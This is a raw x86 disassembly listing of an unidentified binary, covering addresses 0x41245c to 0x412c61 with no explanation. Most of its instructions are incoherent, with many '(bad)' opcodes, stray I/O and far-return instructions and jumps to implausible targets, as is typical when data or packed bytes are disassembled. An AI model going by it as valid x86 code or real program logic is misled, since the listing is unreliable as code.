  41245c:	jmp    esp
  41245e:	inc    DWORD PTR [eax]
  412460:	in     eax,dx
  412461:	add    al,bl
  412463:	jne    0x4123ea
  412465:	mov    edi,edi
  412467:	cld    
  412468:	inc    DWORD PTR [ebp-0x12]
  41246b:	mov    esp,esp
  41246d:	mov    ah,0x85
  41246f:	add    bh,bh
  412471:	call   0x1194d75
  412476:	ret    0x858b
  412479:	cld    
  41247a:	inc    DWORD PTR [eax+0xe301ff]
  412480:	out    dx,al
  412481:	xor    BYTE PTR [ebp-0xff00cf],al
  412487:	mov    ebx,ebp
  412489:	cld    
  41248a:	jo     0x412415
  41248c:	or     DWORD PTR [ecx],eax
  41248e:	add    BYTE PTR [eax],al
  412490:	push   eax
  412491:	add    DWORD PTR [ebp+0x45],eax
  412494:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  41249a:	dec    DWORD PTR [ebx-0x3fda0318]
  4124a0:	add    BYTE PTR [ebp-0xbf0040],dl
  4124a6:	inc    ebp
  4124a7:	or     BYTE PTR [ebx-0x4faf0400],0x45
  4124ae:	add    DWORD PTR [ebx+0x459c00],ecx
  4124b4:	mov    edi,edi
  4124b6:	mov    eax,0xe80800ff
  4124bb:	inc    ebp
  4124bc:	sub    BYTE PTR [ebx-0x47000400],cl
  4124c2:	add    al,0x1
  4124c4:	rol    BYTE PTR [eax],0x1e
  4124c7:	jne    0x41250e
  4124c9:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4124cf:	inc    DWORD PTR [ecx]
  4124d1:	call   0x864cd6
  4124d6:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4124dc:	call   0x414ce2
  4124e1:	xor    bh,bh
  4124e3:	push   edi
  4124e4:	adc    BYTE PTR [ebx-0x747423bb],al
  4124ea:	loopne 0x4124c8
  4124ec:	ret    
  4124ed:	loopne 0x41248b
  4124ef:	xor    DWORD PTR [edx],0x31
  4124f2:	cmp    edi,edi
  4124f4:	bswap  esp
  4124f6:	rol    BYTE PTR gs:[eax],0x5
  4124fa:	jmp    0x12c2644
  4124ff:	mov    eax,DWORD PTR [ebp-0x4]
  412502:	add    BYTE PTR [eax+0xff0100],bh
  412508:	cld    
  412509:	jne    0x412588
  41250b:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  412511:	push   ss
  412512:	add    DWORD PTR [eax],eax
  412514:	add    BYTE PTR [eax+0x7f],dl
  412517:	inc    ebp
  412518:	add    BYTE PTR [ebx+0x459850],cl
  41251e:	mov    edi,edi
  412520:	test   al,0xff
  412522:	add    BYTE PTR [eax],cl
  412524:	inc    DWORD PTR [ebp-0x18]
  412527:	jmp    DWORD PTR ds:0x4d7d00dc
  41252d:	adc    BYTE PTR [ebx+0x459cb9],cl
  412533:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  412539:	pushf  
  41253a:	mov    eax,0x30132
  41253f:	lea    esi,[ebp+0x2c]
  412542:	xor    edi,edi
  412544:	(bad)  
  412545:	call   0x1404cb2
  41254a:	call   0x1354dda
  41254f:	jne    0x4124dc
  412551:	xor    edi,esp
  412553:	add    eax,DWORD PTR [eax+0xc018d]
  412559:	push   DWORD PTR [eax]
  41255b:	call   0xca4cb7
  412560:	int3   
  412561:	inc    DWORD PTR [ebp-0x14]
  412564:	mov    ecx,DWORD PTR [ebp-0x28]
  412567:	xor    eax,DWORD PTR [eax]
  412569:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  41256f:	(bad)  
  412570:	xchg   ebp,eax
  412571:	in     al,0xff
  412573:	add    bh,bh
  412575:	add    BYTE PTR [ebp+0x45],dl
  412578:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  41257e:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  412585:	mov    edi,edi
  412587:	or     BYTE PTR [eax],cl
  412589:	inc    ebp
  41258a:	test   DWORD PTR gs:[eax],eax
  41258d:	je     0x4125d4
  41258f:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  412595:	xor    edx,DWORD PTR [eax-0x73]
  412598:	push   ebp
  412599:	or     BYTE PTR [ebp+0x21007572],al
  41259f:	inc    ebp
  4125a0:	in     al,dx
  4125a1:	mov    ebp,DWORD PTR [eax]
  4125a3:	mov    esp,0x648bc345
  4125a8:	fmul   st,st(5)
  4125aa:	add    BYTE PTR [ebx],ch
  4125ac:	mov    eax,DWORD PTR [ebx]
  4125ae:	cld    
  4125af:	loopne 0x412571
  4125b1:	inc    ebp
  4125b2:	push   ebp
  4125b3:	cmp    ebp,eax
  4125b5:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  4125bc:	cld    
  4125bd:	fadd   DWORD PTR [eax+0x3b014d]
  4125c3:	jne    0x4125f5
  4125c5:	push   0xf8898557
  4125ca:	in     al,dx
  4125cb:	jne    0x412612
  4125cd:	lea    eax,[ebx+0x72e8dcc8]
  4125d3:	das    
  4125d4:	mov    eax,DWORD PTR [eax]
  4125d6:	mov    esp,0x33eb7545
  4125db:	mov    edi,DWORD PTR [edi+0x4572bc]
  4125e1:	xor    eax,edi
  4125e3:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  4125ed:	rcl    BYTE PTR [eax-0x40],1
  4125f0:	inc    ebp
  4125f1:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  4125f9:	inc    ebp
  4125fa:	xchg   ebp,eax
  4125fb:	ud0    ebp,DWORD PTR [ebx]
  4125fe:	inc    DWORD PTR [eax]
  412600:	retf   
  412601:	jbe    0x412603
  412603:	mov    dl,BYTE PTR [eax-0x80]
  412606:	push   ebp
  412607:	pop    ds
  412608:	mov    ecx,DWORD PTR [esp+esi*8]
  41260b:	inc    eax
  41260c:	retf   
  41260d:	inc    ebp
  41260e:	iret   
  41260f:	jb     0x4125d9
  412611:	mov    eax,DWORD PTR [edi]
  412613:	enter  0x4545,0x1
  412617:	xor    DWORD PTR [eax],eax
  412619:	pushf  
  41261a:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  412620:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  412627:	dec    ebp
  412628:	add    BYTE PTR [ebx],dh
  41262a:	inc    ebp
  41262b:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  412631:	xor    dl,BYTE PTR [edx]
  412633:	add    eax,DWORD PTR [ebp-0x77]
  412636:	mov    eax,esp
  412638:	fmul   DWORD PTR [ebp-0x3d]
  41263b:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  412642:	mov    DWORD PTR [ebp-0x28],eax
  412645:	rol    DWORD PTR [ebp-0x64],1
  412648:	xor    eax,edi
  41264a:	mov    ecx,0xff858db0
  41264f:	clc    
  412650:	enter  0x4d45,0x32
  412654:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  41265b:	test   esi,edi
  41265d:	clc    
  41265e:	inc    DWORD PTR [ebp+0x45]
  412661:	cmp    al,0x8b
  412663:	pushf  
  412664:	or     bh,al
  412666:	enter  0x16a8,0x85
  41266a:	xor    eax,edi
  41266c:	pushf  
  41266d:	inc    ebp
  41266e:	(bad)  
  41266f:	ds cld 
  412671:	pushf  
  412672:	inc    ebp
  412673:	mov    edx,DWORD PTR [eax-0x28]
  412676:	lock push ebp
  412678:	add    BYTE PTR [ebx],dh
  41267a:	mov    DWORD PTR [ebx],eax
  41267c:	sar    BYTE PTR [ebx],1
  41267e:	adc    BYTE PTR [edi],cl
  412680:	dec    ebp
  412681:	adc    al,0x8b
  412683:	add    al,dl
  412685:	jmp    0x1022855
  41268a:	jb     0x4126d9
  41268c:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  412692:	xor    ecx,DWORD PTR [ebp+0x3b]
  412695:	xor    ecx,DWORD PTR [edi]
  412697:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  41269b:	(bad)  
  41269d:	clc    
  41269e:	enter  0x8400,0x8b
  4126a2:	pop    es
  4126a3:	mov    al,0x0
  4126a5:	push   ebp
  4126a6:	push   cs
  4126a7:	xor    ecx,eax
  4126a9:	xor    esp,ecx
  4126ab:	add    ebp,DWORD PTR [eax]
  4126ad:	add    esi,DWORD PTR [eax]
  4126af:	(bad)  
  4126b1:	retf   0x55c8
  4126b4:	repnz mov eax,DWORD PTR [ebp-0x10]
  4126b8:	(bad)  
  4126b9:	cli    
  4126ba:	fdivr  st,st(1)
  4126bc:	test   DWORD PTR [eax+edi*8],ecx
  4126bf:	dec    ebp
  4126c0:	inc    ebp
  4126c1:	xor    edi,DWORD PTR [eax-0x7167afd]
  4126c7:	add    BYTE PTR [ebp+0x0],al
  4126ca:	mov    ecx,DWORD PTR [ebp-0x28]
  4126cd:	mov    ecx,ebx
  4126cf:	clc    
  4126d0:	jne    0x41269d
  4126d2:	mov    esi,0xd672d3
  4126d7:	into   
  4126d8:	into   
  4126d9:	scas   eax,DWORD PTR es:[edi]
  4126da:	dec    ebp
  4126db:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  4126e1:	sub    ecx,esi
  4126e3:	cmp    ecx,DWORD PTR [ebp+0x77]
  4126e6:	(bad)  
  4126e7:	mov    edi,eax
  4126e9:	mov    al,0x85
  4126eb:	mov    eax,edi
  4126ed:	add    BYTE PTR [ebp-0x75],al
  4126f0:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  4126f7:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4126fd:	(bad)  
  4126ff:	retf   0x559c
  412702:	(bad)  
  412703:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  41270a:	inc    ebp
  41270b:	add    eax,0xeb9c4d3f
  412710:	(bad)  
  412711:	mov    ecx,esp
  412713:	lods   al,BYTE PTR ds:[esi]
  412714:	test   DWORD PTR [ebp-0x8],edx
  412717:	xor    ecx,DWORD PTR [ebp+0x33]
  41271a:	mov    eax,DWORD PTR [ebx]
  41271c:	lock add ecx,ebx
  41271f:	bswap  esi
  412721:	retf   0x55d1
  412724:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  41272a:	jmp    0x412725
  41272c:	add    BYTE PTR ds:0xebc44d8b,al
  412732:	push   ebp
  412733:	mov    ebp,DWORD PTR [ebx]
  412735:	test   al,0x8b
  412737:	push   ebp
  412738:	clc    
  412739:	xor    ecx,ebx
  41273b:	xor    ecx,esi
  41273d:	add    edx,ecx
  41273f:	add    eax,DWORD PTR [edx+0xca010f]
  412745:	push   ebp
  412746:	dec    ebp
  412747:	mov    ecx,DWORD PTR [ebx-0x34050710]
  41274d:	stc    
  41274e:	rol    DWORD PTR ds:0xebce4dd6,cl
  412754:	scas   eax,DWORD PTR es:[edi]
  412755:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  41275b:	xor    ebp,DWORD PTR [ebx]
  41275d:	xor    edi,DWORD PTR [ebx]
  41275f:	add    esi,DWORD PTR [edi+0x3]
  412762:	mov    ecx,DWORD PTR [edi]
  412764:	clc    
  412765:	retf   0x55cb
  412768:	into   
  412769:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  412770:	mov    eax,0x3376554d
  412775:	mov    esi,DWORD PTR [ebx]
  412777:	int3   
  412778:	add    edx,DWORD PTR [ebp+0x3]
  41277b:	xor    ecx,DWORD PTR [edi]
  41277d:	xor    ecx,edx
  41277f:	add    edx,DWORD PTR [ebp+0x3]
  412782:	mov    ecx,DWORD PTR [edi]
  412784:	lock retf 0x4dfa
  412788:	stc    
  412789:	mov    ecx,DWORD PTR [eax]
  41278b:	or     BYTE PTR [ebp+0x4d],cl
  41278e:	jmp    0x105281e
  412793:	dec    ebp
  412794:	dec    ebp
  412795:	(bad)  
  412796:	mov    ebx,esp
  412798:	clc    
  412799:	test   ebx,ecx
  41279b:	clc    
  41279c:	ror    DWORD PTR [ebp-0x2a],cl
  41279f:	mov    esi,ecx
  4127a1:	call   0x33cc6d55
  4127a6:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  4127ad:	retf   
  4127ae:	ja     0x41277e
  4127b0:	mov    ebp,DWORD PTR [eax-0x48]
  4127b3:	dec    ebp
  4127b4:	xor    ecx,DWORD PTR [di+0x3]
  4127b8:	mov    esp,esp
  4127ba:	clc    
  4127bb:	push   ebp
  4127bc:	retf   
  4127bd:	mov    dl,bl
  4127bf:	adc    esi,edx
  4127c1:	jb     0x412791
  4127c3:	add    BYTE PTR [edi-0x3b7474b3],ch
  4127c9:	call   0x4d6cf34b
  4127ce:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  4127d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127d5:	pushf  
  4127d6:	inc    ebp
  4127d7:	xor    cl,BYTE PTR [ebp-0x78]
  4127da:	mov    edx,edi
  4127dc:	clc    
  4127dd:	dec    ebp
  4127de:	retf   
  4127df:	mov    edx,ebx
  4127e1:	call   0x560ffbbc
  4127e6:	scas   eax,DWORD PTR es:[edi]
  4127e7:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  4127ed:	pushf  
  4127ee:	sub    esi,DWORD PTR [edx]
  4127f0:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  4127f6:	lods   al,BYTE PTR ds:[esi]
  4127f7:	xor    esp,DWORD PTR [ebx]
  4127f9:	add    ecx,DWORD PTR [ebp-0x1c]
  4127fc:	mov    edi,DWORD PTR [ebp-0x8]
  4127ff:	mov    bl,cl
  412801:	cmp    dl,bl
  412803:	jb     0x4127d3
  412805:	add    dh,dl
  412807:	dec    ebp
  412808:	scas   eax,DWORD PTR es:[edi]
  412809:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  41280f:	shr    DWORD PTR [ebx],cl
  412811:	into   
  412812:	cmp    edx,esi
  412814:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  41281a:	dec    ebp
  41281b:	dec    ebp
  41281c:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  412822:	retf   
  412823:	xor    edx,esi
  412825:	add    ecx,esi
  412827:	imul   ecx,edx
  41282a:	mov    DWORD PTR [ebp+0x8],edx
  41282d:	xor    ecx,DWORD PTR [ebp+0x2b]
  412830:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  412836:	add    esi,DWORD PTR [ebx]
  412838:	mov    ah,0x3
  41283a:	inc    ebp
  41283b:	rdtsc  
  41283d:	xlat   BYTE PTR ds:[ebx]
  41283e:	pushf  
  41283f:	jge    0x4127ca
  412841:	xor    ebx,eax
  412843:	sub    eax,DWORD PTR [ebp-0x73]
  412846:	(bad)  
  412847:	cmp    al,al
  412849:	jb     0x4127d0
  41284b:	add    al,bh
  41284d:	ror    DWORD PTR [ebp-0x7a],1
  412850:	xor    edi,edi
  412852:	add    edi,edi
  412854:	jmp    0x4128a3
  412856:	mov    ecx,DWORD PTR [ebx-0x34341324]
  41285c:	dec    ebp
  41285d:	into   
  41285e:	mov    ebp,DWORD PTR [edi-0x23737428]
  412864:	pushf  
  412865:	shl    DWORD PTR [edx],cl
  412867:	retf   0x5588
  41286a:	or     ecx,DWORD PTR [ebp+0x7233114d]
  412870:	add    eax,DWORD PTR [eax]
  412872:	in     al,0x4d
  412874:	push   ebp
  412875:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  41287b:	fs add ch,cl
  41287e:	dec    ebp
  41287f:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  412885:	dec    ebp
  412886:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  41288c:	jge    0x41285c
  41288e:	mov    BYTE PTR [edi+0xf723b3a],ch
  412894:	add    cl,dh
  412896:	dec    ebp
  412897:	dec    DWORD PTR [ebx-0x2c032375]
  41289d:	adc    BYTE PTR [ebp+0x1],0x8b
  4128a1:	add    al,bl
  4128a3:	jge    0x412831
  4128a5:	push   0xffffff9c
  4128a7:	push   0x8b3032
  4128ac:	shl    BYTE PTR [ebp+0x55],0x6a
  4128b0:	xor    edi,edi
  4128b2:	xor    edx,DWORD PTR [ebx+eax*1]
  4128b5:	inc    ebp
  4128b6:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  4128bc:	dec    ebp
  4128bd:	or     BYTE PTR [ecx+0x4dc8e483],cl
  4128c3:	jbe    0x412850
  4128c5:	mov    ebp,esp
  4128c7:	ror    bl,1
  4128c9:	enter  0x14ce,0xaf
  4128cd:	dec    DWORD PTR [ebx-0x2cef17f8]
  4128d3:	push   ebp
  4128d4:	retf   0x5540
  4128d7:	push   ebp
  4128d8:	mov    esi,DWORD PTR [edx-0x1c]
  4128db:	mov    edx,ebx
  4128dd:	cld    
  4128de:	(bad)  
  4128df:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  4128e6:	sti    
  4128e7:	add    dh,cl
  4128e9:	push   0xffffff94
  4128eb:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  4128f2:	bswap  esp
  4128f4:	pop    esi
  4128f5:	inc    ebp
  4128f6:	dec    DWORD PTR [ecx+0x45e8c88b]
  4128fc:	push   ebp
  4128fd:	xor    esi,DWORD PTR [ebx]
  4128ff:	mov    DWORD PTR [ebx],0xcac00f9c
  412905:	aas    
  412906:	push   ebp
  412907:	inc    ebp
  412908:	xor    ecx,eax
  41290a:	add    ecx,eax
  41290c:	mov    eax,DWORD PTR [ebx]
  41290e:	(bad)  
  41290f:	jmp    0x41289d
  412911:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  412918:	les    edi,FWORD PTR [esi-0xeccefb3]
  41291e:	mov    edx,0xff378d80
  412923:	mov    dh,0xd1
  412925:	cmp    edx,DWORD PTR [ebp+0xf]
  412928:	mov    eax,DWORD PTR [edx-0x20]
  41292b:	add    BYTE PTR [ebp-0x75],bh
  41292e:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  412935:	pushf  
  412936:	retf   0x8632
  412939:	cmp    ebp,0x8
  41293c:	call   ebx
  41293e:	inc    ebp
  41293f:	inc    ebp
  412940:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  412946:	mov    esi,DWORD PTR [ecx]
  412948:	enter  0x49c,0xc7
  41294c:	add    al,al
  41294e:	add    bl,al
  412950:	(bad)  
  412951:	clc    
  412952:	enter  0x45,0x31
  412956:	push   eax
  412957:	pushf  
  412958:	mov    edi,eax
  41295a:	int3   
  41295b:	or     al,al
  41295d:	test   DWORD PTR [edi],edi
  41295f:	clc    
  412960:	gs inc ebp
  412962:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  412968:	push   ss
  412969:	xor    ecx,DWORD PTR [ebp+0x3]
  41296c:	sub    edx,DWORD PTR [ecx-0x76]
  41296f:	dec    ebp
  412970:	add    DWORD PTR [ebx+0x88d845],ecx
  412976:	mov    esi,DWORD PTR [ebx]
  412978:	or     BYTE PTR [ebx],al
  41297a:	cmp    edx,DWORD PTR [ecx-0x38]
  41297d:	dec    ebp
  41297e:	out    dx,eax
  41297f:	xor    eax,DWORD PTR [ebp+0x3]
  412982:	mov    edx,DWORD PTR [ecx-0x28]
  412985:	dec    ebp
  412986:	add    BYTE PTR [ebx],dh
  412988:	push   0x518003
  41298d:	push   eax
  41298e:	add    BYTE PTR [ebx-0x300748b],cl
  412994:	sbb    BYTE PTR [ebp+0x45],cl
  412997:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  41299d:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  4129a3:	dec    ebp
  4129a4:	inc    ebp
  4129a5:	xor    ecx,eax
  4129a7:	add    ecx,eax
  4129a9:	push   ecx
  4129aa:	(bad)  
  4129ab:	dec    ebp
  4129ac:	mov    al,ds:0xc5e03dff
  4129b1:	retf   
  4129b2:	(bad)  
  4129b3:	into   
  4129b4:	sub    bh,bh
  4129b6:	dec    esp
  4129b7:	adc    al,0x9c
  4129b9:	inc    ebp
  4129ba:	push   ebp
  4129bb:	test   DWORD PTR [edi],ecx
  4129bd:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  4129c4:	jmp    0xc9ba38d8
  4129c9:	add    cl,dl
  4129cb:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4129d5:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  4129db:	rol    BYTE PTR [eax],0x55
  4129de:	clc    
  4129df:	fs jb  0x4129e9
  4129e2:	mov    eax,DWORD PTR [ebp-0x30]
  4129e5:	xor    al,0x40
  4129e7:	sub    al,0xc7
  4129e9:	mov    ah,ch
  4129eb:	add    DWORD PTR [ebp+0x4534f845],eax
  4129f1:	sub    al,0x86
  4129f3:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  4129fa:	mov    ch,0xff
  4129fc:	clc    
  4129fd:	add    DWORD PTR [ebp+0x60],0x3d
  412a01:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  412a08:	inc    ebp
  412a09:	dec    DWORD PTR [ebx-0x341ff701]
  412a0f:	test   esi,ecx
  412a11:	dec    DWORD PTR [ebx-0x7f8a3301]
  412a17:	push   eax
  412a18:	add    DWORD PTR [ebp+0x0],eax
  412a1b:	dec    ebx
  412a1d:	or     al,0xce
  412a1f:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  412a26:	into   
  412a27:	add    BYTE PTR [ebx-0x34ff1400],cl
  412a2d:	mov    esi,ecx
  412a2f:	sar    bh,0x45
  412a32:	adc    al,0x8b
  412a34:	clc    
  412a35:	fadd   DWORD PTR [ebp+0x0]
  412a38:	mov    ebp,DWORD PTR [edx+0x8]
  412a3b:	push   edi
  412a3c:	adc    BYTE PTR [eax+0x1],0x83
  412a40:	add    al,al
  412a42:	retf   
  412a43:	mov    ecx,esi
  412a45:	cld    
  412a46:	mov    eax,DWORD PTR [eax+0xcb01cc]
  412a4c:	into   
  412a4d:	add    BYTE PTR [ebx+0x756aec00],cl
  412a53:	jne    0x412a88
  412a55:	inc    DWORD PTR [ebx]
  412a57:	rcl    BYTE PTR [ecx+0x50],1
  412a5a:	push   eax
  412a5b:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  412a61:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  412a68:	sar    bh,0x84
  412a6b:	or     BYTE PTR [ebx],al
  412a6d:	push   eax
  412a6e:	add    BYTE PTR [ebx+0x4532c845],cl
  412a74:	pushf  
  412a75:	xor    edi,eax
  412a77:	pushf  
  412a78:	mov    ah,0x89
  412a7a:	test   eax,ebp
  412a7c:	clc    
  412a7d:	inc    ebp
  412a7e:	inc    ebp
  412a7f:	mov    DWORD PTR [eax+eax*8],esi
  412a82:	sub    al,0x30
  412a84:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  412a8b:	dec    ebp
  412a8c:	xor    eax,DWORD PTR fs:[edi+0x3]
  412a90:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  412a96:	xor    eax,DWORD PTR fs:[edi+0x3]
  412a9a:	or     DWORD PTR [ecx+0x45ff085c],0x0
  412aa1:	shl    DWORD PTR [ebp-0x380064],1
  412aa7:	int3   
  412aa8:	lea    eax,[ebp+0x45fff860]
  412aae:	push   eax
  412aaf:	xor    dh,BYTE PTR [ebp-0x64]
  412ab2:	(bad)  
  412ab3:	(bad)  
  412ab4:	pop    esp
  412ab5:	lods   al,BYTE PTR ds:[esi]
  412ab6:	inc    DWORD PTR [ebp+0x4508f8ff]
  412abc:	mov    edi,DWORD PTR [eax+edx*8]
  412abf:	pushf  
  412ac0:	jo     0x412a89
  412ac2:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  412ac9:	inc    ebp
  412aca:	add    BYTE PTR [esi],bh
  412acc:	push   0x8b809c
  412ad1:	in     al,dx
  412ad2:	inc    ebp
  412ad3:	push   ebp
  412ad4:	mov    esi,DWORD PTR [ebx]
  412ad6:	cld    
  412ad7:	add    eax,DWORD PTR [eax+0xf013b]
  412add:	adc    al,0x0
  412adf:	add    bh,bh
  412ae1:	jmp    0xbe2bfe
  412ae6:	add    BYTE PTR [ebp+0x45],cl
  412ae9:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  412aef:	dec    ebp
  412af0:	push   0x38033
  412af5:	cmp    eax,DWORD PTR [eax]
  412af7:	unpcklps xmm7,xmm0
  412afa:	jne    0x412afc
  412afc:	dec    DWORD PTR [ebx+0x5545cc18]
  412b02:	mov    DWORD PTR [ebx],esi
  412b04:	shl    BYTE PTR [ebx],1
  412b06:	inc    ebp
  412b07:	add    ecx,DWORD PTR [ecx+0x60fc803]
  412b0d:	retf   0x5575
  412b10:	dec    DWORD PTR [ebx-0x5ba17e8]
  412b16:	(bad)  
  412b17:	stc    
  412b18:	in     al,dx
  412b19:	or     al,0x85
  412b1b:	dec    ebp
  412b1c:	clc    
  412b1d:	xor    eax,DWORD PTR [ebp+0x3]
  412b20:	mov    ebp,ecx
  412b22:	rol    BYTE PTR [eax],1
  412b24:	inc    ebp
  412b25:	add    BYTE PTR [eax-0x7747ab3],bh
  412b2b:	clc    
  412b2c:	inc    ebp
  412b2d:	retf   
  412b2e:	mov    edx,ebx
  412b30:	in     al,dx
  412b31:	(bad)  
  412b32:	retf   
  412b33:	into   
  412b34:	into   
  412b35:	scas   eax,DWORD PTR es:[edi]
  412b36:	dec    ebp
  412b37:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  412b3d:	sub    ecx,esi
  412b3f:	cmp    ecx,DWORD PTR [ebp+0x77]
  412b42:	(bad)  
  412b43:	mov    edi,eax
  412b45:	int3   
  412b46:	test   DWORD PTR [ecx-0x74baff08],ecx
  412b4c:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  412b53:	xor    eax,DWORD PTR [ebp+0x4503f803]
  412b59:	(bad)  
  412b5b:	retf   0x559c
  412b5e:	(bad)  
  412b5f:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  412b66:	inc    ebp
  412b67:	add    eax,0xeb9c4d3f
  412b6c:	(bad)  
  412b6d:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  412b73:	xor    ecx,DWORD PTR [ebp+0x33]
  412b76:	mov    eax,DWORD PTR [ebx]
  412b78:	call   0xce50f680
  412b7d:	retf   0x55d1
  412b80:	test   BYTE PTR [ebx-0x5ff17fe],cl
  412b86:	jmp    0x412b81
  412b88:	add    BYTE PTR ds:0xebf44d8b,al
  412b8e:	push   ebp
  412b8f:	mov    ebp,DWORD PTR [ebx]
  412b91:	mov    eax,0x33f8558b
  412b96:	retf   
  412b97:	xor    ecx,esi
  412b99:	add    edx,ecx
  412b9b:	add    eax,DWORD PTR [edx+0xca010f]
  412ba1:	push   ebp
  412ba2:	dec    ebp
  412ba3:	mov    ecx,DWORD PTR [ebx-0x34050718]
  412ba9:	stc    
  412baa:	rol    DWORD PTR ds:0xebce4dd6,cl
  412bb0:	scas   eax,DWORD PTR es:[edi]
  412bb1:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  412bb7:	xor    ebp,DWORD PTR [ebx]
  412bb9:	xor    edi,DWORD PTR [ebx]
  412bbb:	add    esi,DWORD PTR [edi+0x3]
  412bbe:	mov    ecx,DWORD PTR [edi]
  412bc0:	clc    
  412bc1:	retf   0x55cb
  412bc4:	into   
  412bc5:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  412bcc:	test   al,0x4d
  412bce:	push   ebp
  412bcf:	jbe    0x412c04
  412bd1:	mov    esi,DWORD PTR [ebx]
  412bd3:	mov    al,0x3
  412bd5:	push   ebp
  412bd6:	add    esi,DWORD PTR [ebx]
  412bd8:	rdpmc  
  412bda:	retf   0x5503
  412bdd:	add    ecx,DWORD PTR [ebx-0x53517f1]
  412be3:	dec    ebp
  412be4:	stc    
  412be5:	mov    ecx,DWORD PTR [eax]
  412be7:	or     BYTE PTR [ebp+0x4d],cl
  412bea:	jmp    0x1352c7a
  412bef:	dec    ebp
  412bf0:	dec    ebp
  412bf1:	(bad)  
  412bf2:	mov    ebx,esp
  412bf4:	clc    
  412bf5:	test   ebx,ecx
  412bf7:	clc    
  412bf8:	ror    DWORD PTR [ebp-0x2a],cl
  412bfb:	mov    esi,ecx
  412bfd:	lock scas eax,DWORD PTR es:[edi]
  412bff:	inc    ebp
  412c00:	mov    esi,DWORD PTR [ebx]
  412c02:	hlt    
  412c03:	pushf  
  412c04:	jge    0x412b91
  412c06:	sub    ebx,esp
  412c08:	cmp    ecx,ebx
  412c0a:	ja     0x412bda
  412c0c:	mov    ebp,DWORD PTR [eax-0x58]
  412c0f:	dec    ebp
  412c10:	xor    ecx,DWORD PTR [di+0x3]
  412c14:	mov    esp,esp
  412c16:	clc    
  412c17:	push   ebp
  412c18:	retf   
  412c19:	mov    dl,bl
  412c1b:	adc    esi,edx
  412c1d:	jb     0x412bed
  412c1f:	add    BYTE PTR [edi-0xb7474b3],ch
  412c25:	lock jge 0x412bf3
  412c28:	sub    ecx,DWORD PTR [ebp+0x3b]
  412c2b:	mov    esi,DWORD PTR [edi-0x20]
  412c2e:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  412c35:	mov    BYTE PTR [ebx-0x34b20729],cl
  412c3b:	mov    edx,ebx
  412c3d:	lock (bad) 
  412c3f:	ror    esi,cl
  412c41:	push   ebp
  412c42:	scas   eax,DWORD PTR es:[edi]
  412c43:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  412c49:	pushf  
  412c4a:	sub    esi,DWORD PTR [edx]
  412c4c:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  412c52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c53:	xor    esp,DWORD PTR [ebx]
  412c55:	add    ecx,DWORD PTR [ebp-0x1c]
  412c58:	mov    edi,DWORD PTR [ebp-0x8]
  412c5b:	mov    bl,cl
  412c5d:	cmp    dl,bl
  412c5f:	jb     0x412c2f
  412c61:	add    dh,dl
